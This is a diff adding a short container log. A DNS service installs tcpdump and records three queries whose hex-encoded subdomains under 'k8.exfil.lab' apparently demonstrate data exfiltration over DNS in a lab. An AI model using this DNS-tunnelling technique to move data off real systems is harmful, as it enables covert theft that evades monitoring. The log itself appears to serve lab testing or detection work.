@@ -1,0 +1,9 @@
+﻿dns-1  | (1/2) Installing libpcap (1.10.7-r0)
+dns-1  | (2/2) Installing tcpdump (4.99.6-r1)
+dns-1  | Executing busybox-1.37.0-r31.trigger
+dns-1  | OK: 9318 KiB in 18 packages
+dns-1  | tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+dns-1  | listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+dns-1  | 20:49:32.630225 IP 172.20.0.4.58379 > 172.20.0.2.53: 30919+ [1au] A? 3234353532303131323838.k8.exfil.lab. (76)
+dns-1  | 20:49:32.632823 IP 172.20.0.4.45275 > 172.20.0.2.53: 30919+ [1au] A? 3234353532303131323838.k8.exfil.lab. (76)
+dns-1  | 20:49:32.633474 IP 172.20.0.4.33368 > 172.20.0.2.53: 30919+ [1au] A? 3234353532303131323838.k8.exfil.lab. (76)
